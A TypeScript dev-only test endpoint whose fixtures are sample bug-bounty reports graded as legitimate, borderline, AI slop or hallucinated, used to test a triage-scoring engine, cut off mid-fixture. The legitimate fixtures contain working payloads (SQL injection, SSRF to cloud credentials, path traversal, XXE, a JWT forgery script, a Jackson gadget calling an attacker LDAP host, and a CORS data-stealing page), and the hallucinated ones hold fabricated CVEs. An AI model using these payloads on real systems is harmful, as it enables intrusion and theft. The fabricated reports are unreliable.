// v3.6.0 §7: Dev-only test endpoint that runs the engines against a labeled
// fixture battery (T1: legit, T2: borderline, T3: slop, T4: hallucinated)
// and reports composite + Engine 2 + triage distributions per cohort.
// Each fixture asserts an expected composite range, an expected Engine 2
// (substance) range, and an expected triage action set so a regression in
// any one dimension fails the suite. Mounted only when NODE_ENV !==
// "production". Public-only, no DB writes.
import { Router, type IRouter } from "express";
import { analyzeWithEnginesTraced } from "../lib/engines";
import { generateTriageRecommendation } from "../lib/triage-recommendation";
import { performActiveVerification } from "../lib/active-verification";

const router: IRouter = Router();

type Tier = "T1_LEGIT" | "T2_BORDERLINE" | "T3_SLOP" | "T4_HALLUCINATED";
type TriageAction =
  | "AUTO_CLOSE"
  | "MANUAL_REVIEW"
  | "CHALLENGE_REPORTER"
  | "PRIORITIZE"
  | "STANDARD_TRIAGE";

interface Fixture {
  id: string;
  tier: Tier;
  text: string;
  claimedCwes?: string[];
  expectedComposite: [number, number];
  expectedEngine2: [number, number];
  expectedTriage: TriageAction[];
}

// =============================================================================
// T1 — Legitimate, well-evidenced reports (target composite >= 60, E2 >= 60)
// =============================================================================

const T1: Fixture[] = [
  {
    id: "T1-01-uaf-libfoo",
    tier: "T1_LEGIT",
    text: `# CVE-2024-1234 — Heap Use-After-Free in libfoo parser
**Affected:** libfoo 1.2.0–1.3.4 — github.com/example/libfoo
**Root cause:** parser/parse.c:412 frees \`buf\` on early-exit then re-uses it at line 418 inside \`foo_finalize()\`.

\`\`\`asan
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000a1c0 at pc 0x55e9b8c2f3d2
READ of size 8 at 0x60200000a1c0 thread T0
    #0 0x55e9b8c2f3d1 in foo_finalize parser/parse.c:418
    #1 0x55e9b8c2e210 in foo_main parser/main.c:88
freed by thread T0 here:
    #0 0x7f0001 in __interceptor_free
    #1 0x55e9b8c2f1aa in parser/parse.c:412
\`\`\`

\`\`\`diff
--- a/parser/parse.c
+++ b/parser/parse.c
@@ -410,7 +410,7 @@ int foo_parse(buf_t *buf) {
-    free(buf->payload);
+    /* defer free until finalize */
\`\`\`

POST /api/v1/parse HTTP/1.1
Host: example.test
Content-Type: application/octet-stream
Content-Length: 32

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-416"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-02-sqli-django",
    tier: "T1_LEGIT",
    text: `# SQL Injection via raw queryset in admin export
**Affected:** github.com/myorg/myapp commit 7d3c9e1, file apps/admin/views.py:234
**CWE-89** — Improper Neutralization of Special Elements in SQL Command

The export view at apps/admin/views.py:234 builds a raw SQL string by
concatenating the request.GET["sort"] parameter without escaping:

\`\`\`python
# apps/admin/views.py
def export_csv(request):
    sort = request.GET.get("sort", "id")
    qs = User.objects.raw(f"SELECT * FROM users ORDER BY {sort}")  # line 234
    return render_csv(qs)
\`\`\`

PoC request:

\`\`\`http
GET /admin/export?sort=id;DROP%20TABLE%20sessions-- HTTP/1.1
Host: app.example.test
Cookie: sessionid=abc123
\`\`\`

Fix (verified locally against 4.2.7):

\`\`\`diff
-    qs = User.objects.raw(f"SELECT * FROM users ORDER BY {sort}")
+    if sort not in ALLOWED_SORTS: sort = "id"
+    qs = User.objects.raw("SELECT * FROM users ORDER BY %s" % sort)
\`\`\`

CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-89"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-03-ssrf-aws",
    tier: "T1_LEGIT",
    text: `# SSRF in /api/fetch-thumbnail leaks AWS metadata
**Affected:** github.com/acme/imgservice main, src/handlers/thumbnail.go:88
**CWE-918** — Server-Side Request Forgery

The thumbnail handler fetches a user-supplied URL with no host allowlist
and no protocol restriction. AWS IMDSv1 is reachable from the container.

\`\`\`go
// src/handlers/thumbnail.go:82-94
func Thumbnail(w http.ResponseWriter, r *http.Request) {
    raw := r.URL.Query().Get("src")
    resp, err := http.Get(raw)               // line 88: no validation
    if err != nil { http.Error(w, err.Error(), 502); return }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}
\`\`\`

PoC (returns 169.254.169.254 metadata as the image body):

\`\`\`http
GET /api/fetch-thumbnail?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1
Host: imgservice.example.test
\`\`\`

Captured response excerpt:
\`\`\`
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
\`\`\`

Mitigation: enforce allowlist + IMDSv2 token requirement.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`,
    claimedCwes: ["CWE-918"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-04-pathtraversal-flask",
    tier: "T1_LEGIT",
    text: `# Path Traversal in /downloads/<filename>
**Affected:** github.com/openexample/files-app v0.9.2, app/routes.py:117
**CWE-22**

The download route concatenates the user-supplied filename onto the uploads
directory without normalization. \`../\` sequences escape the sandbox.

\`\`\`python
# app/routes.py:115-121
@bp.route("/downloads/<path:filename>")
def download(filename):
    target = os.path.join(UPLOAD_DIR, filename)   # line 117
    return send_file(target)
\`\`\`

PoC:

\`\`\`http
GET /downloads/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: files.example.test
\`\`\`

Server returns the contents of /etc/passwd. Verified against the public
demo instance at https://demo.example.test on 2024-09-12.

Fix:

\`\`\`diff
-    target = os.path.join(UPLOAD_DIR, filename)
+    target = safe_join(UPLOAD_DIR, filename)
+    if not target.startswith(UPLOAD_DIR + os.sep):
+        abort(404)
\`\`\``,
    claimedCwes: ["CWE-22"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-05-xxe-libxml",
    tier: "T1_LEGIT",
    text: `# XXE in /api/import/xml — entity expansion enabled
**Affected:** github.com/widgetco/widget-importer 2.4.1, src/parsers/xml_loader.cpp:204
**CWE-611**

\`xml_loader.cpp:204\` constructs a libxml2 parser context with
\`XML_PARSE_NOENT\` set and no entity loader override, so DOCTYPE entity
references are resolved against the local filesystem.

\`\`\`cpp
// src/parsers/xml_loader.cpp:200-210
xmlDocPtr load_xml(const std::string& body) {
    int opts = XML_PARSE_NOENT | XML_PARSE_DTDLOAD;   // line 204
    return xmlReadMemory(body.data(), body.size(),
                         "import.xml", nullptr, opts);
}
\`\`\`

PoC payload posted to /api/import/xml:

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<r>&x;</r>
\`\`\`

Response includes the contents of /etc/hostname inside the parsed result.

Fix: drop \`XML_PARSE_NOENT\`/\`XML_PARSE_DTDLOAD\`; install
\`xmlSetExternalEntityLoader\` returning NULL.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`,
    claimedCwes: ["CWE-611"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-06-prototype-pollution",
    tier: "T1_LEGIT",
    text: `# Prototype pollution in deepMerge() of @example/utils 2.1.0
**Affected:** github.com/example-org/utils, src/deepMerge.ts:47-62 (commit 9a1b3f2)
**CWE-1321**

\`\`\`ts
// src/deepMerge.ts:47
export function deepMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {        // line 49 — no __proto__ guard
    if (typeof source[key] === "object") deepMerge(target[key] ??= {}, source[key]);
    else target[key] = source[key];
  }
  return target;
}
\`\`\`

PoC:
\`\`\`js
const { deepMerge } = require("@example/utils");
deepMerge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
console.log({}.polluted); // -> true
\`\`\`

Fix: skip key if \`key === "__proto__" || key === "constructor"\`.
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`,
    claimedCwes: ["CWE-1321"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-07-jwt-none",
    tier: "T1_LEGIT",
    text: `# Auth bypass: JWT \`alg: none\` accepted on /api/me
**Affected:** github.com/foosvc/api v0.14.2, src/middleware/auth.go:31
**CWE-347** — Improper Verification of Cryptographic Signature

\`\`\`go
// src/middleware/auth.go:28-37
tok, err := jwt.Parse(raw, func(t *jwt.Token) (interface{}, error) {
    return []byte(secret), nil   // line 31: returns key for *any* alg
})
\`\`\`

PoC (generates and uses a forged token):
\`\`\`bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -H "Authorization: Bearer $HEADER.$PAYLOAD." https://api.example.test/api/me
# -> {"id":1,"role":"admin"}
\`\`\`

Fix: enforce \`if t.Method.Alg() != "HS256" { return nil, errBadAlg }\` in the keyfunc.`,
    claimedCwes: ["CWE-347"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-08-redis-cmdinj",
    tier: "T1_LEGIT",
    text: `# CRLF injection into Redis command builder
**Affected:** github.com/cacheco/cacheco 1.7.0, lib/redis_client.rb:88
**CWE-93**

The client builds RESP commands by string interpolation; a value containing
\`\\r\\n\` lets an attacker append a second Redis command.

\`\`\`ruby
# lib/redis_client.rb:85-92
def set(key, value)
  cmd = "*3\\r\\n$3\\r\\nSET\\r\\n$#{key.bytesize}\\r\\n#{key}\\r\\n$#{value.bytesize}\\r\\n#{value}\\r\\n"
  @sock.write(cmd)
end
\`\`\`

PoC:
\`\`\`ruby
client.set("foo", "bar\\r\\n*1\\r\\n$8\\r\\nFLUSHALL\\r\\n")
# -> Subsequent FLUSHALL drops every key in the database
\`\`\`

Fix: use the official \`redis\` gem or a length-prefixed serializer rather than string concatenation.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-93"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW", "CHALLENGE_REPORTER"],
  },
  {
    id: "T1-09-ssrf-graphql",
    tier: "T1_LEGIT",
    text: `# SSRF via GraphQL fetchUrl resolver
**Affected:** github.com/widgets-co/api commit a4b6c8d, schema/resolvers/fetch.js:55
**CWE-918**

\`\`\`js
// schema/resolvers/fetch.js:52-60
fetchUrl: async (_, { url }) => {
  const r = await fetch(url);                 // line 55: no validation
  return await r.text();
}
\`\`\`

GraphQL query that exfiltrates GCP metadata:
\`\`\`graphql
{ fetchUrl(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") }
\`\`\`

Response includes \`{"access_token":"ya29...","expires_in":3599}\`.

Fix: enforce a domain allowlist + reject RFC-1918 / link-local / loopback resolution.`,
    claimedCwes: ["CWE-918"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-10-rce-deserialize",
    tier: "T1_LEGIT",
    text: `# Insecure deserialization in /api/session/restore (Java/Jackson)
**Affected:** github.com/acme/portal 3.4.1, src/main/java/com/acme/SessionCtrl.java:118
**CWE-502**

The endpoint deserializes user-controlled JSON with default typing enabled,
allowing class instantiation gadgets (e.g. \`com.sun.rowset.JdbcRowSetImpl\`).

\`\`\`java
// SessionCtrl.java:115-122
ObjectMapper m = new ObjectMapper();
m.enableDefaultTyping();                                 // line 117
return m.readValue(req.getReader(), SessionState.class); // line 118
\`\`\`

PoC payload:
\`\`\`json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker.example.test/x","autoCommit":true}]
\`\`\`

Fix: remove \`enableDefaultTyping()\`; use \`@JsonTypeInfo\` with a strict allowlist.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-502"],
    expectedComposite: [55, 95],
    expectedEngine2: [55, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-11-toctou-symlink",
    tier: "T1_LEGIT",
    text: `# TOCTOU symlink race in log rotation script
**Affected:** github.com/observ-co/agent 1.5.3, scripts/rotate.sh:22-34
**CWE-367**

\`rotate.sh\` checks \`-f /var/log/agent.log\` then \`mv\` — between the check
and move an attacker who controls /var/log can replace the path with a
symlink to /etc/shadow, causing the next mv+chmod to clobber it.

\`\`\`bash
# scripts/rotate.sh:22-34
if [ -f "$LOGFILE" ]; then        # line 24 (TOCTOU)
  mv "$LOGFILE" "$LOGFILE.1"      # line 26
  chmod 600 "$LOGFILE.1"
fi
\`\`\`

PoC (run as the agent user):
\`\`\`bash
while true; do ln -sf /etc/shadow /var/log/agent.log; done &
systemctl start agent-rotate.service
\`\`\`

Fix: open the file with \`O_NOFOLLOW\`, then operate on the fd via \`/proc/self/fd/N\`.`,
    claimedCwes: ["CWE-367"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW", "CHALLENGE_REPORTER"],
  },
  {
    id: "T1-12-cors-credentials",
    tier: "T1_LEGIT",
    text: `# CORS misconfiguration leaks user data via reflected origin
**Affected:** github.com/dashco/dashboard 0.22.4, server/cors.ts:12-19
**CWE-942**

\`\`\`ts
// server/cors.ts:12-19
app.use((req, res, next) => {
  const o = req.headers.origin;
  if (o) res.setHeader("Access-Control-Allow-Origin", o);   // line 15: reflects any origin
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});
\`\`\`

PoC HTML hosted at attacker.example.test:
\`\`\`html
<script>
  fetch("https://dash.example.test/api/me", {credentials: "include"})
    .then(r => r.text()).then(t => navigator.sendBeacon("/steal", t));
</script>
\`\`\`

Fix: replace reflection with an explicit allowlist of trusted origins.`,
    claimedCwes: ["CWE-942"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
];

// =============================================================================
// T2 — Borderline reports: real intent, weak evidence (composite 35–65)
// =============================================================================

const T2: Fixture[] = [
  {
    id: "T2-01-xss-unconfirmed",
    tier: "T2_BORDERLINE",
    text: `# Possible XSS in /admin/dashboard

The /admin/dashboard endpoint may reflect user input. I noticed when I
submit \`<script>alert(1)</script>\` in the search box, the value appears
in the page source. I haven't confirmed it executes in the browser yet.

Steps:
1. Go to /admin/dashboard
2. Enter the payload in search
3. Observe the response

Environment: Chrome 120, target running their public demo.

References:
- OWASP XSS cheat sheet`,
    expectedComposite: [30, 65],
    expectedEngine2: [25, 65],
    expectedTriage: ["MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-02-csrf-noproof",
    tier: "T2_BORDERLINE",
    text: `# Suspected CSRF on /account/email-change

The /account/email-change endpoint accepts POST without checking a token,
based on the response headers I saw in DevTools. I tried sending the same
request from a different origin but the cookies didn't transmit so I
can't confirm exploitability end-to-end.

What I observed:
- Request: POST /account/email-change with form field new_email
- Response: 200 OK, no CSRF token validated server-side that I can see
- SameSite attribute on the session cookie is unset

Suggested fix: add a CSRF token bound to the session and verify on POST.

I don't have a working PoC HTML page to demonstrate the cross-origin
trigger. Happy to try harder if you confirm SameSite is genuinely missing.`,
    expectedComposite: [10, 35],
    expectedEngine2: [5, 30],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T2-03-info-disclosure-headers",
    tier: "T2_BORDERLINE",
    text: `# Server version exposed in response headers

The application returns Server: nginx/1.18.0 and X-Powered-By: Express
on every response. While this isn't directly exploitable, it makes
fingerprinting trivial and could help an attacker target known CVEs in
those specific versions.

Reproduction:

\`\`\`http
HEAD / HTTP/1.1
Host: app.example.test

HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Powered-By: Express
\`\`\`

Recommendation: strip both headers via reverse proxy / express config.

I'm aware this is low severity — submitting as informational.`,
    expectedComposite: [30, 60],
    expectedEngine2: [25, 60],
    expectedTriage: ["MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-04-rate-limit-missing",
    tier: "T2_BORDERLINE",
    text: `# /api/login appears to lack rate limiting

I tried sending 100 POST requests to /api/login with random passwords and
all 100 returned 401 within about 4 seconds. There was no slowdown, no
captcha, and no account lockout that I could detect.

Tooling: a small bash loop with curl. I didn't try a real password
spraying attack — I stopped after observing the lack of throttling
because I didn't want to lock anyone out.

This is consistent with no rate limiting on the auth endpoint, which
would let an attacker enumerate weak passwords given a list of usernames.

Suggested fix: per-IP and per-account exponential backoff after 5
failures within 5 minutes.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-05-clickjack-noframeguard",
    tier: "T2_BORDERLINE",
    text: `# Clickjacking: /account/delete loads in iframe

curl -I https://app.example.test/account/delete returns no
X-Frame-Options or Content-Security-Policy frame-ancestors header. I
hosted a quick test page on a private domain and confirmed the page
loads inside an <iframe>.

I did not produce a working overlay PoC that tricks the user into
clicking "Delete account" — that would require knowing the exact pixel
positions and coordinating with a logged-in victim, which I haven't
done.

Recommend: \`Content-Security-Policy: frame-ancestors 'none'\`.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-06-mixed-content",
    tier: "T2_BORDERLINE",
    text: `# Mixed-content warning on /pricing

When loading https://www.example.test/pricing the browser console reports
that an analytics script is loaded over plain http://. Because the site
serves an HSTS header most browsers will block this and break analytics
rather than degrade security, but the warning suggests the page template
hardcodes an http:// URL somewhere.

I haven't found the exact line in the template. Browser console message:

\`\`\`
Mixed Content: The page at 'https://www.example.test/pricing' was loaded
over HTTPS, but requested an insecure script 'http://cdn.example.test/an.js'.
\`\`\`

Recommend a search for hardcoded http:// in templates and asset
configs.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-07-idor-suspicion",
    tier: "T2_BORDERLINE",
    text: `# Possible IDOR on /api/orders/:id

I noticed that GET /api/orders/12345 returns the order even when my
session belongs to a different account. I only tested with my own two
test accounts (id 12345 belonging to test-A and id 12346 belonging to
test-B). Logged in as test-A, I requested /api/orders/12346 and got
back the full order body.

I haven't checked whether the IDs are easily enumerable across real
customers, or whether other entity types behave the same way. Could be
an authorization bug or could be intentional (e.g. shared org).

Steps to reproduce included; happy to expand if you confirm intent.`,
    expectedComposite: [15, 55],
    expectedEngine2: [10, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-08-weak-jwt-secret",
    tier: "T2_BORDERLINE",
    text: `# JWT signed with a short HMAC secret (suspected)

The JWTs your app issues decode to HS256 with a sub/exp/iss claim set.
I ran hashcat against a single token using the rockyou wordlist for
~10 minutes and didn't get a hit, so I have no proof the secret is
weak — only that the algorithm choice + lack of kid rotation invites
offline brute force if a token ever leaks.

Suggested hardening: rotate to RS256 (or at minimum HS384 with a
randomly generated 32-byte secret), add a kid header for rotation,
and shorten exp.

I can run a longer wordlist if you'd like — but submitting now in case
the algorithm/kid recommendation is independently useful.`,
    expectedComposite: [10, 55],
    expectedEngine2: [5, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-09-stack-trace-on-error",
    tier: "T2_BORDERLINE",
    text: `# Stack trace exposed when /api/search receives malformed JSON

POST /api/search with body \`{\` (literal opening brace) returns a 500 with
a full Node.js stack trace in the response body, including absolute file
paths under /home/deploy/api/src and the version of the JSON parser.

This isn't directly exploitable but it discloses the deploy path and
internal module structure. Likely a missing error handler in
src/middleware/parse-json.js (path inferred from the leaked trace).

Recommend: catch SyntaxError in the JSON body parser and respond with
a generic 400, plus drop NODE_ENV=production-style stack-trace
suppression in the global error handler.`,
    expectedComposite: [10, 55],
    expectedEngine2: [5, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-10-open-redirect",
    tier: "T2_BORDERLINE",
    text: `# Possible open redirect on /auth/callback?next=

After logging in, the app redirects to whatever URL is in the \`next\`
query parameter. I tested:

- /auth/callback?next=/dashboard -> redirects to /dashboard (expected)
- /auth/callback?next=https://example.attacker.test/ -> redirects to the external host

This would let a phishing email link to a real login URL on your domain
that ends up landing the victim on an attacker-controlled page after
auth, which is great for credential-prompt phishing.

Suggested fix: validate \`next\` is a same-origin path beginning with
"/" and not "//", or maintain an explicit allowlist.`,
    expectedComposite: [15, 55],
    expectedEngine2: [10, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
];

// =============================================================================
// T3 — AI-generated slop: vague, no evidence, no specifics
// =============================================================================

const T3: Fixture[] = [
  {
    id: "T3-01-generic-letter",
    tier: "T3_SLOP",
    text: `# Critical Security Vulnerability in Your Application

Dear Security Team,

I am writing to report a critical security issue I have identified in your
application. As an experienced security researcher, I believe this issue
poses a significant risk and should be addressed immediately.

The application appears to be vulnerable to multiple types of attacks
including but not limited to SQL injection, XSS, CSRF, and remote code
execution. These vulnerabilities could allow an attacker to compromise
the entire system.

I recommend you implement industry best practices and follow the OWASP
Top 10 to mitigate these risks. Please consider sanitizing all user input
and using parameterized queries where appropriate.

I look forward to your prompt response and a fair bug bounty.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-02-marketing-tone",
    tier: "T3_SLOP",
    text: `# Comprehensive Security Assessment Report

I am pleased to present this comprehensive security assessment of your
application. After thorough review, I have identified several critical
vulnerabilities that require immediate attention.

Key findings:
- Authentication mechanisms could be strengthened
- Input validation may be insufficient in certain areas
- Session management practices should be reviewed
- Error handling might leak sensitive information

These issues, while requiring further investigation, represent significant
risk to your organization's security posture. I strongly recommend
engaging a professional security firm for a full audit.

I am available to discuss remediation strategies and would welcome the
opportunity to assist further. Please advise on your bounty program.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-03-checklist-no-evidence",
    tier: "T3_SLOP",
    text: `# Multiple OWASP Top 10 Findings

I performed a security review and found the following issues per OWASP
Top 10 2021:

A01 — Broken Access Control: present
A02 — Cryptographic Failures: likely
A03 — Injection: possible in multiple endpoints
A04 — Insecure Design: yes
A05 — Security Misconfiguration: confirmed
A06 — Vulnerable Components: needs audit
A07 — Identification and Authentication Failures: probable
A08 — Software and Data Integrity Failures: possible
A09 — Security Logging Failures: insufficient logging
A10 — SSRF: maybe

Each of these represents a serious risk. Recommended remediation: follow
secure coding standards and conduct a comprehensive review.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-04-buzzword-soup",
    tier: "T3_SLOP",
    text: `# 🚨 CRITICAL: Application Vulnerable to Modern Threat Landscape 🚨

After conducting a comprehensive zero-trust assessment of the attack
surface, I have identified that the application does not adequately
defend against the modern threat landscape, including but not limited to:

- Advanced Persistent Threats (APT)
- Zero-day exploits
- Supply chain attacks
- Lateral movement
- Privilege escalation
- Defense evasion

The lack of a comprehensive defense-in-depth posture, combined with
insufficient telemetry and a weak security culture, results in elevated
business risk that should be remediated immediately by adopting
industry-standard frameworks (NIST CSF, ISO 27001, MITRE ATT&CK).

I recommend an urgent leadership-level discussion. CVSS estimate: 9.8.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-05-no-target",
    tier: "T3_SLOP",
    text: `# Critical SQL Injection vulnerability

Your application is vulnerable to SQL injection. SQL injection is a very
serious vulnerability that can allow an attacker to read, modify, or
delete data in your database. It can also lead to full server compromise
in many cases.

You should fix this immediately by using parameterized queries instead
of string concatenation when building SQL statements.

CVSS: 9.8 (Critical)
CWE: CWE-89

Please prioritize this bug — the impact is severe.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-06-vague-xss",
    tier: "T3_SLOP",
    text: `# XSS in your application

I found that your application contains an XSS vulnerability. Cross-site
scripting (XSS) is a vulnerability where user input is reflected back
into the page without proper escaping, allowing an attacker to execute
arbitrary JavaScript in another user's browser.

This is a serious issue and should be fixed by escaping all user input
before rendering it. Use a templating engine that escapes by default
(such as React, which escapes by default) and apply a strong Content
Security Policy.

I have not included a specific endpoint or payload because the issue
appears to be systemic across the codebase.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-07-handwave-rce",
    tier: "T3_SLOP",
    text: `# Remote Code Execution possible

It appears that under certain conditions a remote attacker may be able
to execute arbitrary code on your server. This is the most serious class
of vulnerability and should be addressed with the highest urgency.

Mitigations:
1. Keep all dependencies up to date.
2. Apply the principle of least privilege.
3. Run the application in a sandboxed container.
4. Enable runtime application self-protection (RASP).
5. Conduct regular penetration testing.

I have flagged this as Critical given the potential business impact of
RCE.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-08-checklist",
    tier: "T3_SLOP",
    text: `# Security Posture Review — Findings

After reviewing your public-facing application, I have identified the
following areas of concern:

1. **Authentication weaknesses** — multi-factor authentication is not
   enforced for all user roles.
2. **Logging gaps** — security-relevant events do not appear to be
   logged centrally.
3. **Patch hygiene** — there are likely outdated dependencies in use.
4. **Encryption** — data at rest may not be encrypted with customer-
   managed keys.
5. **Secrets management** — secrets may be present in environment
   variables rather than a vault.

Each item is independently low/medium severity but together represent a
material risk. Please consider a holistic remediation plan.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-09-ssrf-handwave",
    tier: "T3_SLOP",
    text: `# SSRF (Server-Side Request Forgery) vulnerability

Your service is likely vulnerable to SSRF. Server-Side Request Forgery
allows an attacker to coerce the server into making requests to internal
services, which can be used to exfiltrate cloud metadata credentials and
pivot deeper into the network.

To remediate:
- Block requests to RFC1918 ranges and link-local addresses.
- Use an explicit allowlist of outbound hosts.
- Disable unused URL schemes (file://, gopher://, dict://).

I am submitting this as Critical (9.1) given the typical impact of SSRF
in cloud environments.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
];

// =============================================================================
// T4 — Hallucinated reports: confident specifics that are fabricated
// =============================================================================

const T4: Fixture[] = [
  {
    id: "T4-01-fake-cve-fake-fn",
    tier: "T4_HALLUCINATED",
    text: `# RCE in nodejs/node via fabricated_function()

The function \`fabricated_function()\` in src/imaginary/file.c at line 999999
allows remote code execution.

\`\`\`
==99999==ERROR: at 0x10000000: in nonexistent_func (made/up/path:0)
\`\`\`

CVE-9999-99999 was assigned by an unknown CNA. Memory corruption occurs
at 0x10000000, then 0x20000000, then 0x30000000, then 0x40000000.

Repository: https://github.com/nodejs/node`,
    claimedCwes: ["CWE-94"],
    expectedComposite: [35, 60],
    expectedEngine2: [30, 55],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-02-round-addresses",
    tier: "T4_HALLUCINATED",
    text: `# Heap overflow in libcurl via memcpy at fixed addresses

I have identified a heap overflow in github.com/curl/curl. The bug occurs
in the function \`Curl_handle_response()\` at lib/handler.c:50000 where
memcpy writes to the address 0x40000000 with length 0x80000000.

The vulnerability is triggered by sending a crafted response from the
server. The corruption pattern is consistent across runs:

- Frame 0: 0x10000000 in handle_chunked
- Frame 1: 0x20000000 in receive_data
- Frame 2: 0x30000000 in dispatch_response
- Frame 3: 0x40000000 in Curl_handle_response

CVE-2099-50000 has been reserved.`,
    claimedCwes: ["CWE-787"],
    expectedComposite: [0, 40],
    expectedEngine2: [0, 50],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-03-plagiarized-nvd",
    tier: "T4_HALLUCINATED",
